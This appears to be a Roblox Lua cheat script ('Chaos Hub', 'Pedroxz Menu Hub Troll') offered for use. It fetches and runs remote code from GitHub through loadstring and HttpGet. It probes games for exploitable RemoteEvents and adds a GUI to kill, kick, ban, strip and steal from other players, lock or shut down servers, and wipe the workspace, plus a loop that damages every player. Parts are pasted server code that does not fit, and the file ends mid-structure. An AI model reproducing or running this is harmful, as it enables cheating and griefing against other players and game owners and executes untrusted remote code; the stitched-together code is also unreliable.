local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/pedroxzytbhypee/SourcePedrox8/main/README.md')))()
    
    --Config do Script
    local Window = OrionLib:MakeWindow({Name = "                               Chaos Hub E.B ", HidePremium = false, SaveConfig = true, IntroEnabled = false})
    local Player = game.Players.LocalPlayer

    OrionLib:MakeNotification({
        Name = "Welcome to Chaos Hub!",
        Content = "Welcome to Chaos Hub"..Player.Name.." ",
        Image = "rbxassetid://7733715400",
        Time = 5
    })

    --Funcao do anti algema
	function Algema()
		while _G.Algema == true do
					local event = game:GetService("ReplicatedStorage").Arrest
			local distance = 10
			 
			 
			event.OnServerEvent:Connect(function(policeman, arrested) -- when the event gets fired, the server will do the following commands:
				if(arrested.Team ~= game.Teams.Police) then --if the player's team is not police then
					if(policeman:DistanceFromCharacter(arrested.Character:WaitForChild("HumanoidRootPart").Position) > distance) then
						return nil
					end
					if(arrested.BadArea.Value == true and arrested.Team == game.Teams.Prisoners) then --If he is a prisoner in the area he is not allowed to.
						arrested.Character:WaitForChild("Humanoid").WalkSpeed = 0 --Set the arrested person walk speed to 0
						arrested.Character:WaitForChild("Humanoid").JumpPower = 0 --Set the arrested person jump power to 0
						local clone1 = game:GetService("ServerStorage").Handcuff:Clone() --Clone the handcuff cylinder we made
						local clone2 = game:GetService("ServerStorage").Handcuff:Clone() --Clone the handcuff cylinder we made again
						clone1.Parent = arrested.Character --Set it's parent to the character
						clone2.Parent = arrested.Character --Set it's parent to the character
						local motor = Instance.new("Motor6D", arrested.Character) --Create a new motor 6d and set it's parent to the character
						local motor2 = Instance.new("Motor6D", arrested.Character) --Create a new motor 6d again and set it's parent to the character
						motor.Part0 = arrested.Character.LeftHand --The part0 of the motor 6d is the leftHand
						motor.Part1 = clone1 --The part0 of the motor 6d is the handcuff clone 1
						motor2.Part0 = arrested.Character.RightHand --The part0 of the motor 6d 2 is the rightHand
						motor2.Part1 = clone2 --The part0 of the motor 6d 3 is the handcuff clone 2
						local chain = Instance.new("RopeConstraint", arrested.Character) --Create a new rope constraint inside the character
						local atta1 = Instance.new("Attachment", clone1) --Create a new attachment inside the clone1
						local atta2 = Instance.new("Attachment", clone2)--Create a new attachment inside the clone2
						chain.Length = 1 --Set the rope's length to 1
						chain.Thickness = 0.2 --Set the rope's thickness to 0.2
						chain.Attachment0 = atta1 --The rope's attachment 1 is the atta1 attachment
						chain.Attachment1 = atta2 --The rope's attachment 2 is the atta2 attachment
						chain.Color = BrickColor.new("Light stone grey") --Set the rope color to gray
						chain.Visible = true --Make it visible
						arrested.BadArea.Value = false
						game.ReplicatedStorage.ArrestAnim:FireClient(arrested) --Fire the client fromthe event we created
						wait(6) --Cooldown between arresting and playing animation
						arrested.Team = game.Teams.Prisoners --change the team of the player to prisoner
						arrested:LoadCharacter() --respawn him
					elseif(arrested.Team == game.Teams.Criminals) then  --If he is a criminal, the area he is inside does not matter, he will get arrested
						arrested.Character:WaitForChild("Humanoid").WalkSpeed = 0 --Set the arrested person walk speed to 0
						arrested.Character:WaitForChild("Humanoid").JumpPower = 0 --Set the arrested person jump power to 0
						local clone1 = game:GetService("ServerStorage").Handcuff:Clone() --Clone the handcuff cylinder we made
						local clone2 = game:GetService("ServerStorage").Handcuff:Clone() --Clone the handcuff cylinder we made again
						clone1.Parent = arrested.Character --Set it's parent to the character
						clone2.Parent = arrested.Character --Set it's parent to the character
						local motor = Instance.new("Motor6D", arrested.Character) --Create a new motor 6d and set it's parent to the character
						local motor2 = Instance.new("Motor6D", arrested.Character) --Create a new motor 6d again and set it's parent to the character
						motor.Part0 = arrested.Character.LeftHand --The part0 of the motor 6d is the leftHand
						motor.Part1 = clone1 --The part0 of the motor 6d is the handcuff clone 1
						motor2.Part0 = arrested.Character.RightHand --The part0 of the motor 6d 2 is the rightHand
						motor2.Part1 = clone2 --The part0 of the motor 6d 3 is the handcuff clone 2
						local chain = Instance.new("RopeConstraint", arrested.Character) --Create a new rope constraint inside the character
						local atta1 = Instance.new("Attachment", clone1) --Create a new attachment inside teh clone1
						local atta2 = Instance.new("Attachment", clone2)--Create a new attachment inside teh clone2
						chain.Length = 1 --Set the rope's length to 1
						chain.Thickness = 0.2 --Set the rope's thickness to 0.2
						chain.Attachment0 = atta1 --The rope's attachment 1 is the atta1 attachment
						chain.Attachment1 = atta2 --The rope's attachment 2 is the atta2 attachment
						chain.Color = BrickColor.new("Light stone grey") --Set the rope color to gray
						chain.Visible = true --Make it visible
						game.ReplicatedStorage.ArrestAnim:FireClient(arrested) --Fire the client fromthe event we created
						arrested.BadArea.Value = false
						wait(6) --Cooldown between arresting and playing animation
						arrested.Team = game.Teams.Prisoners --change the team of the player to prisoner
						arrested:LoadCharacter() --respawn him
					end
				end
			end)
		end
		end

    --Funcao do Control tp 
	function ControlTP()
		while _G.ControlTP == true do
			local UIS = game:GetService("UserInputService")
 
local Player = game.Players.LocalPlayer
local Mouse = Player:GetMouse()
 
 
function GetCharacter()
   return game.Players.LocalPlayer.Character
end
 
function Teleport(pos)
   local Char = GetCharacter()
   if Char then
       Char:MoveTo(pos)
   end
end
 
 
UIS.InputBegan:Connect(function(input)
   if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
       Teleport(Mouse.Hit.p)
   end
end)
wait(0.1)
		end
	end

    --Funcao do Serial Killer loop by pedroxz
    function Loop()
        while _G.Loop == true do
            local DR = game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage
 
            for PlayerIndex,GivenPlayer in pairs(game.Players:GetPlayers()) do
                local Char = GivenPlayer.Character
                DR:FireServer(Char.Humanoid,Char.Humanoid.MaxHealth,0,0)
            end
              end    
            wait(0.1)
            end
	    
    --Funcao ativar/desativar
    function Aimbot()
        while _G.Aimbot == true do
            loadstring(game:HttpGet('https://raw.githubusercontent.com/fatesc/fates-esp/main/main.lua'))()
            wait(0.1)
        end
    end
    
local StarterGui = game:GetService("StarterGui")
local showNotification = true

function Notify(tl, t, d) 
if showNotification == true then
StarterGui:SetCore("SendNotification", {
	Title = tl;
	Text = t;
	Duration = d;
})
end
end

if game.CoreGui:FindFirstChild("destruct") then
game.CoreGui.destruct:Destroy()
end

local BlurFX = Instance.new("BlurEffect")
BlurFX.Size = 0
BlurFX.Name = "Blur"
BlurFX.Parent = workspace.CurrentCamera

local function blurefct(siz)
local TweenService = game:GetService("TweenService")
local goal = {}
goal.Size = siz

local tweenInfo = TweenInfo.new(2)
local tween = TweenService:Create(BlurFX, tweenInfo, goal)

tween:Play()
end

local remote = "nil"
local found = false
local enable = false
local sent = false
local LocalPlayer = game:GetService("Players").LocalPlayer
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local checkIn = {"Workspace", "ReplicatedStorage"}
local names = {"Delete", "Car", "Bike", "Bus", "Trem", "Remove", "Destroy", "Clean", "Clear","Bullet", "Bala", "Shoot", "Shot", "Fire", "Segway", "Handless", "Sword", "Attack", "Despawn", "Deletar", "Apagar", "Spawn"}
if char then
blurefct(20)
Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
for _, service in pairs(checkIn) do
for i,v in pairs(game:GetService(service):GetDescendants()) do
for _, str in pairs(names) do
if string.match(v.Name, str) and v:IsA("RemoteEvent") then
print("Checking " .. v.Name .. " from " .. service .. " service from " .. str .. " category")
local success, error = pcall(function()
v:FireServer(LocalPlayer.Character.Head)
found = true
end)
if success then
remote = v
end 
wait(0.5)
if not char:FindFirstChild("Head") then
enable = true
sent = true
end
end
end
end
end
end

if sent == false then
Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
blurefct(0)
end

function work(arg1)
remote:FireServer(arg1)
end

function GetPlayer(String)
   local Found = {}
   local strl = String:lower()
   if strl == "all" then
       for i,v in pairs(game.Players:GetPlayers()) do
           table.insert(Found,v.Name)
       end
   elseif strl == "others" then
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.Name ~= game.Players.LocalPlayer.Name then
               table.insert(Found,v.Name)
           end
       end  
elseif strl == "me" then
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.Name == game.Players.LocalPlayer.Name then
               table.insert(Found,v.Name)
           end
       end  
   else
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.Name:lower():sub(1, #String) == String:lower() then
               table.insert(Found,v.Name)
           end
       end    
   end
   return Found    
end
if enable == true then
blurefct(0)
print("Using " .. remote.Name)
Notify("Pedroxz Menu Hub Troll Carregado!", "Comandos & GUI carregado.", 5)
local destruct = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local line = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local scripts = Instance.new("ScrollingFrame")
local UIGridLayout = Instance.new("UIGridLayout")
local kill = Instance.new("TextButton")
local kick = Instance.new("TextButton")
local ban = Instance.new("TextButton")
local unban = Instance.new("TextButton")
local goto = Instance.new("TextButton")
local view = Instance.new("TextButton")
local unview = Instance.new("TextButton")
local btools = Instance.new("TextButton")
local nuke = Instance.new("TextButton")
local naked = Instance.new("TextButton")
local faceless = Instance.new("TextButton")
local nolimbs = Instance.new("TextButton")
local hatless = Instance.new("TextButton")
local sink = Instance.new("TextButton")
local rtools = Instance.new("TextButton")
local stools = Instance.new("TextButton")
local slock = Instance.new("TextButton")
local player = Instance.new("TextBox")
local ranims = Instance.new("TextButton")
local ragdoll = Instance.new("TextButton")
local shutdown = Instance.new("TextButton")
local punish = Instance.new("TextButton")
local rseat = Instance.new("TextButton")
local dstc = Instance.new("ScreenGui")
local note = Instance.new("Frame")
local text = Instance.new("TextLabel")
local logo = Instance.new("ImageLabel")

dstc.Name = "dstc"
dstc.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
dstc.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
dstc.Parent = game.CoreGui

note.Name = "note"
note.Parent = dstc
note.BackgroundColor3 = Color3.fromRGB(44, 45, 45)
note.BorderColor3 = Color3.fromRGB(0, 0, 0)
note.Position = UDim2.new(0.088, 0,0.75, 0)
note.Size = UDim2.new(0, 302, 0, 105)

text.Name = "text"
text.Parent = note
text.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
text.BackgroundTransparency = 1.000
text.BorderSizePixel = 0
text.ClipsDescendants = true
text.Position = UDim2.new(0, 0, 0.0666668862, 0)
text.Size = UDim2.new(0, 302, 0, 97)
text.Font = Enum.Font.SourceSansBold
text.Text = "Commands: Luq & UI: Luca\nRun admin commands in-game without needing to worry about Filtering Enabled\nUse the internal GUI to execute commands\nVersion: ".. version .. "\nStatus: Running"
text.TextColor3 = Color3.fromRGB(255, 255, 255)
text.TextSize = 18.000
text.TextWrapped = true
text.TextYAlignment = Enum.TextYAlignment.Top

logo.Name = "logo"
logo.Parent = note
logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
logo.BackgroundTransparency = 1.000
logo.Position = UDim2.new(-0.350993365, 0, 0, 0)
logo.Size = UDim2.new(0, 106, 0, 107)
logo.Image = "http://www.roblox.com/asset/?id=8388262491"
logo.ScaleType = Enum.ScaleType.Fit

destruct.Name = "destruct"
destruct.Parent = game.CoreGui
destruct.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

main.Name = "main"
main.Parent = destruct
main.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
main.BackgroundTransparency = 0.3
main.BorderSizePixel = 0
main.Position = UDim2.new(0.268847764, 0, 0.372854918, 0)
main.Size = UDim2.new(0, 325, 0, 239)
main.Active = true

local UserInputService = game:GetService("UserInputService")

local gui = main

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.05, true)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.292307675, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 134, 0, 25)
TextLabel.Font = Enum.Font.Roboto
TextLabel.Text = "Hub Troll Pedroxz Menu"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 17.000

line.Name = "line"
line.Parent = main
line.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
line.BorderSizePixel = 0
line.Position = UDim2.new(0, 0, 0.106986806, 0)
line.Size = UDim2.new(0, 325, 0, 6)

ImageLabel.Parent = main
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.184615389, 0, 0, 0)
ImageLabel.Size = UDim2.new(0, 25, 0, 25)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8388262491"
ImageLabel.ScaleType = Enum.ScaleType.Fit

scripts.Name = "scripts"
scripts.Parent = main
scripts.Active = true
scripts.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
scripts.BackgroundTransparency = 1
scripts.BorderSizePixel = 0
scripts.Position = UDim2.new(0, 0, 0.134782612, 0)
scripts.Size = UDim2.new(0, 325, 0, 173)
scripts.CanvasSize = UDim2.new(0, 0, 1.150, 0)

UIGridLayout.Parent = scripts
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 100, 0, 30)

kill.Name = "kill"
kill.Parent = scripts
kill.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
kill.BorderSizePixel = 0
kill.Size = UDim2.new(0, 200, 0, 50)
kill.Font = Enum.Font.Roboto
kill.Text = "Kill"
kill.TextColor3 = Color3.fromRGB(255, 255, 255)
kill.TextSize = 14.000

kick.Name = "kick"
kick.Parent = scripts
kick.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
kick.BorderSizePixel = 0
kick.Size = UDim2.new(0, 200, 0, 50)
kick.Font = Enum.Font.Roboto
kick.Text = "Kick"
kick.TextColor3 = Color3.fromRGB(255, 255, 255)
kick.TextSize = 14.000

ban.Name = "ban"
ban.Parent = scripts
ban.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
ban.BorderSizePixel = 0
ban.Size = UDim2.new(0, 200, 0, 50)
ban.Font = Enum.Font.Roboto
ban.Text = "Ban"
ban.TextColor3 = Color3.fromRGB(255, 255, 255)
ban.TextSize = 14.000

unban.Name = "unban"
unban.Parent = scripts
unban.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
unban.BorderSizePixel = 0
unban.Size = UDim2.new(0, 200, 0, 50)
unban.Font = Enum.Font.Roboto
unban.Text = "UnBan"
unban.TextColor3 = Color3.fromRGB(255, 255, 255)
unban.TextSize = 14.000

goto.Name = "goto"
goto.Parent = scripts
goto.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
goto.BorderSizePixel = 0
goto.Size = UDim2.new(0, 200, 0, 50)
goto.Font = Enum.Font.Roboto
goto.Text = "Goto"
goto.TextColor3 = Color3.fromRGB(255, 255, 255)
goto.TextSize = 14.000

view.Name = "view"
view.Parent = scripts
view.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
view.BorderSizePixel = 0
view.Size = UDim2.new(0, 200, 0, 50)
view.Font = Enum.Font.Roboto
view.Text = "View"
view.TextColor3 = Color3.fromRGB(255, 255, 255)
view.TextSize = 14.000

unview.Name = "unview"
unview.Parent = scripts
unview.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
unview.BorderSizePixel = 0
unview.Size = UDim2.new(0, 200, 0, 50)
unview.Font = Enum.Font.Roboto
unview.Text = "UnView"
unview.TextColor3 = Color3.fromRGB(255, 255, 255)
unview.TextSize = 14.000

btools.Name = "btools"
btools.Parent = scripts
btools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
btools.BorderSizePixel = 0
btools.Size = UDim2.new(0, 200, 0, 50)
btools.Font = Enum.Font.Roboto
btools.Text = "BTools"
btools.TextColor3 = Color3.fromRGB(255, 255, 255)
btools.TextSize = 14.000

nuke.Name = "nuke"
nuke.Parent = scripts
nuke.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
nuke.BorderSizePixel = 0
nuke.Size = UDim2.new(0, 200, 0, 50)
nuke.Font = Enum.Font.Roboto
nuke.Text = "Nuke"
nuke.TextColor3 = Color3.fromRGB(255, 255, 255)
nuke.TextSize = 14.000

naked.Name = "naked"
naked.Parent = scripts
naked.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
naked.BorderSizePixel = 0
naked.Size = UDim2.new(0, 200, 0, 50)
naked.Font = Enum.Font.Roboto
naked.Text = "Naked"
naked.TextColor3 = Color3.fromRGB(255, 255, 255)
naked.TextSize = 14.000

faceless.Name = "faceless"
faceless.Parent = scripts
faceless.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
faceless.BorderSizePixel = 0
faceless.Size = UDim2.new(0, 200, 0, 50)
faceless.Font = Enum.Font.Roboto
faceless.Text = "Faceless"
faceless.TextColor3 = Color3.fromRGB(255, 255, 255)
faceless.TextSize = 14.000

nolimbs.Name = "nolimbs"
nolimbs.Parent = scripts
nolimbs.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
nolimbs.BorderSizePixel = 0
nolimbs.Size = UDim2.new(0, 200, 0, 50)
nolimbs.Font = Enum.Font.Roboto
nolimbs.Text = "NoLimbs"
nolimbs.TextColor3 = Color3.fromRGB(255, 255, 255)
nolimbs.TextSize = 14.000

hatless.Name = "hatless"
hatless.Parent = scripts
hatless.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
hatless.BorderSizePixel = 0
hatless.Size = UDim2.new(0, 200, 0, 50)
hatless.Font = Enum.Font.Roboto
hatless.Text = "Hatless"
hatless.TextColor3 = Color3.fromRGB(255, 255, 255)
hatless.TextSize = 14.000

sink.Name = "sink"
sink.Parent = scripts
sink.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
sink.BorderSizePixel = 0
sink.Size = UDim2.new(0, 200, 0, 50)
sink.Font = Enum.Font.Roboto
sink.Text = "Sink"
sink.TextColor3 = Color3.fromRGB(255, 255, 255)
sink.TextSize = 14.000

rtools.Name = "rtools"
rtools.Parent = scripts
rtools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
rtools.BorderSizePixel = 0
rtools.Size = UDim2.new(0, 200, 0, 50)
rtools.Font = Enum.Font.Roboto
rtools.Text = "Rtools"
rtools.TextColor3 = Color3.fromRGB(255, 255, 255)
rtools.TextSize = 14.000

stools.Name = "stools"
stools.Parent = scripts
stools.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
stools.BorderSizePixel = 0
stools.Size = UDim2.new(0, 200, 0, 50)
stools.Font = Enum.Font.Roboto
stools.Text = "Stools"
stools.TextColor3 = Color3.fromRGB(255, 255, 255)
stools.TextSize = 14.000

slock.Name = "slock"
slock.Parent = scripts
slock.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
slock.BorderSizePixel = 0
slock.Size = UDim2.new(0, 200, 0, 50)
slock.Font = Enum.Font.Roboto
slock.Text = "Slock"
slock.TextColor3 = Color3.fromRGB(255, 255, 255)
slock.TextSize = 14.000

player.Name = "player"
player.Parent = main
player.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
player.BorderSizePixel = 0
player.Position = UDim2.new(0.0246153846, 0, 0.870292902, 0)
player.Size = UDim2.new(0, 310, 0, 23)
player.ClearTextOnFocus = false
player.Font = Enum.Font.SourceSans
player.PlaceholderColor3 = Color3.fromRGB(152, 152, 152)
player.PlaceholderText = "PLAYER"
player.Text = ""
player.TextColor3 = Color3.fromRGB(255, 255, 255)
player.TextSize = 14.000

ragdoll.Name = "ragdoll"
ragdoll.Parent = scripts
ragdoll.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
ragdoll.BorderSizePixel = 0
ragdoll.Position = UDim2.new(0, 0, 0.898455501, 0)
ragdoll.Size = UDim2.new(0, 100, 0, 24)
ragdoll.Font = Enum.Font.SourceSans
ragdoll.Text = "Ragdoll"
ragdoll.TextColor3 = Color3.fromRGB(255, 255, 255)
ragdoll.TextSize = 14.000

ranims.Name = "ranims"
ranims.Parent = scripts
ranims.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
ranims.BorderSizePixel = 0
ranims.Position = UDim2.new(0, 0, 0.898455501, 0)
ranims.Size = UDim2.new(0, 100, 0, 24)
ranims.Font = Enum.Font.SourceSans
ranims.Text = "Ranim"
ranims.TextColor3 = Color3.fromRGB(255, 255, 255)
ranims.TextSize = 14.000

shutdown.Name = "shutdown"
shutdown.Parent = scripts
shutdown.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
shutdown.BorderSizePixel = 0
shutdown.Size = UDim2.new(0, 200, 0, 50)
shutdown.Font = Enum.Font.Roboto
shutdown.Text = "Shutdown"
shutdown.TextColor3 = Color3.fromRGB(255, 255, 255)
shutdown.TextSize = 14.000

punish.Name = "punish"
punish.Parent = scripts
punish.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
punish.BorderSizePixel = 0
punish.Size = UDim2.new(0, 200, 0, 50)
punish.Font = Enum.Font.Roboto
punish.Text = "Punish"
punish.TextColor3 = Color3.fromRGB(255, 255, 255)
punish.TextSize = 14.000

rseat.Name = "rseat"
rseat.Parent = scripts
rseat.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
rseat.BorderSizePixel = 0
rseat.Size = UDim2.new(0, 200, 0, 50)
rseat.Font = Enum.Font.Roboto
rseat.Text = "Rseat"
rseat.TextColor3 = Color3.fromRGB(255, 255, 255)
rseat.TextSize = 14.000

local bannedPlayers = {}
local serverlock = false
local sdown = false
local cam = workspace.CurrentCamera

function GetBannedPlayer(target)
local Found = {}
for _, str in pairs(bannedPlayers) do
if str:find(target) then
table.insert(Found, str)
break
end
end
return Found
end

game:GetService("Players").PlayerAdded:Connect(function(plr)
for i,v in pairs(bannedPlayers) do
if plr.Name == v then
Notify("Banned User", plr.Name .. " Tried to join the game", 5)
work(plr)
end
end
if serverlock == true then
Notify("Join Attempt", plr.Name .. " Tried to join the game but the server is locked", 5)
work(plr)
end
if sdown == true then
work(plr)
end
end)

btools.MouseButton1Click:Connect(function()
local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
local Equipped = false

Tool.RequiresHandle = false
Tool.Name = "Destroy Tool"
local Field = Instance.new("SelectionBox",game.Workspace)
local Mouse = game.Players.LocalPlayer:GetMouse()
Field.LineThickness = 0.1
Tool.TextureId = "http://www.roblox.com/asset/?id=12223874"
Tool.Equipped:Connect(function()
Equipped = true

while Equipped == true do
if Mouse.Target ~= nil then
Field.Adornee = Mouse.Target
Mouse.Icon = "rbxasset://textures/HammerCursor.png"
else
Field.Adornee = nil
Mouse.Icon = ""
end
wait()
end
end)


Tool.Unequipped:Connect(function()
Equipped = false
Field.Adornee = nil
Mouse.Icon = ""
end)

Tool.Activated:Connect(function()
if Mouse.Target ~= nil then
print(Mouse.Target)
remote:FireServer(Mouse.Target, {Value = Mouse.Target})
local ex = Instance.new'Explosion'
ex.BlastRadius = 0
ex.Position = Mouse.Target.Position
ex.Parent = workspace

local AttemptTarget = Mouse.Target
while AttemptTarget ~= nil do
AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
AttemptTarget.CanCollide = false
wait()
end
end
end)
end)

kill.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
            spawn(function()
            if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            work(game:GetService("Players")[v].Character.Torso.Neck)
            else
            work(game:GetService("Players")[v].Character.Head.Neck)
            end
end)
end
end)

naked.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt") then
spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt"))
end)
end
if game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants") then
spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants"))
end)
end
if game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic") then
spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic"))
end)
end
end
end)

ranims.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
work(game:GetService("Players")[v].Character.Humanoid:FindFirstChild("Animator"))
end
end
end)

nolimbs.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
spawn(function()
if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
names = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
for _, str in pairs(names) do
work(game:GetService("Players")[v].Character[str])
end
else
names = {"LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg"}
for _, str in pairs(names) do
work(game:GetService("Players")[v].Character[str])
end
end
end)
end
end)

kick.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
spawn(function()
work(game:GetService("Players")[v])
end)
end
end)

nuke.MouseButton1Click:Connect(function()
for i,c in pairs(game.Workspace:GetChildren()) do
    all = c
        work(all)
end
end)

ban.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
spawn(function()
if not table.find(bannedPlayers, v.Name) then
plr = game:GetService("Players")[v]
table.insert(bannedPlayers, plr.Name)
Notify("Banned", plr.Name .. " Will not be able to join the server", 5)
work(plr)
end
end)
end
end)

unban.MouseButton1Click:Connect(function()
for i,v in pairs(GetBannedPlayer(player.Text)) do
spawn(function()
table.remove(bannedPlayers, table.find(bannedPlayers, v))
Notify("UnBanned", v .." Is now able to join the server", 5)
end)
end
end)

goto.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
end
end)

sink.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
spawn(function()
destr = game:GetService("Players")[v].Character["HumanoidRootPart"]
work(destr)
end)
end
end)

faceless.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
spawn(function()
destructwashere = game:GetService("Players")[v].Character.Head.face
work(destructwashere)
end)
end
end)

hatless.MouseButton1Click:Connect(function()
for i, v in pairs(GetPlayer(player.Text)) do
for i, h in pairs(game:GetService("Players")[v].Character:GetChildren()) do
if h:IsA("Accessory") then
work(h)
end
end
end
end)

ragdoll.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
spawn(function()
e = game:GetService("Players")[v].Character:FindFirstChild("Humanoid")
work(e)
end)
end
end)

local toggle = false

slock.MouseButton1Click:Connect(function()
if toggle == false then
slock.Text = "UnSlock"
Notify("Server Locked", "Nobody can join the server", 5)
serverlock = true
toggle = true
elseif toggle == true then
slock.Text = "Slock"
Notify("Server Unlocked", "Anyone can join the server", 5)
serverlock = false
toggle = false
end
end)

view.MouseButton1Click:Connect(function()
for i, v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
cam.CameraSubject = game:GetService("Players")[v].Character.Humanoid
end
end
end)

unview.MouseButton1Click:Connect(function()
if LocalPlayer.Character:FindFirstChild("Humanoid") then
cam.CameraSubject = LocalPlayer.Character.Humanoid
end
end)

shutdown.MouseButton1Click:Connect(function()
sdown = true
Notify("Shutdown", "Shutdowning server..", 5)
for i, v in pairs(game:GetService("Players"):GetPlayers()) do
spawn(function()
if v.Name ~= LocalPlayer.Name then
work(v)
repeat wait() until not game:GetService("Players"):FindFirstChild(v)
work(LocalPlayer)
end
end)
end
end)

rtools.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
spawn(function()
backpack = game:GetService("Players")[v]["Backpack"] or game:GetService("Players")[v]:WaitForChild("Backpack")
for i,t in pairs(backpack:GetChildren()) do
if t:IsA("BackpackItem") and t:FindFirstChild("Handle") then
work(t)
end
end
end)
end
end)

stools.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid"))
repeat wait() until game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid").Parent == nil
for i,v in pairs(game:GetService("Players")[v].Character:GetChildren()) do
if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v)
end
end
end)
end
end)

punish.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(player.Text)) do
            spawn(function()
            work(game:GetService("Players")[v].Character)
end)
end
end)

rseat.MouseButton1Click:Connect(function()
for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
if v:IsA("VehicleSeat") then
work(v)
end
end
end)
end

-- GUI, Scripts/Commands by Luca and luq.
  	end    
})
    local JogadorTab = Window:MakeTab({
        Name = "Jogador",
        Icon = "rbxassetid://13687632207",
